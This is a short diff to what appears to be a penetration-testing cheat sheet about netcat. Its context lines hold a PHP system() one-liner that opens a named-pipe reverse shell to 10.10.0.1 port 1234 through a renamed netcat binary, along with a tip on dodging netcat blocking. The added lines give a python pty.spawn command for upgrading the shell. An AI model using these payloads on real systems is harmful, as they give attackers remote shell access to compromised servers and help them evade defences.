@@ -23,6 +23,10 @@ If having issues with netcat, could be blocked. Copy it to a new location and gi
 Connect to local host with harmless netcat:
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/harmless 10.10.0.1 1234 >/tmp/f') ?>
 
+Can try to spawn a tty shell:
+python -c 'import pty; pty.spawn("/bin/sh")'
+https://netsec.ws/?p=337
+
 Transferring files with netcat
 ============================
 Piping through base64 to help prevent file corruption. Can check md5sum on remote before and on local after to ensure 100% transfer.
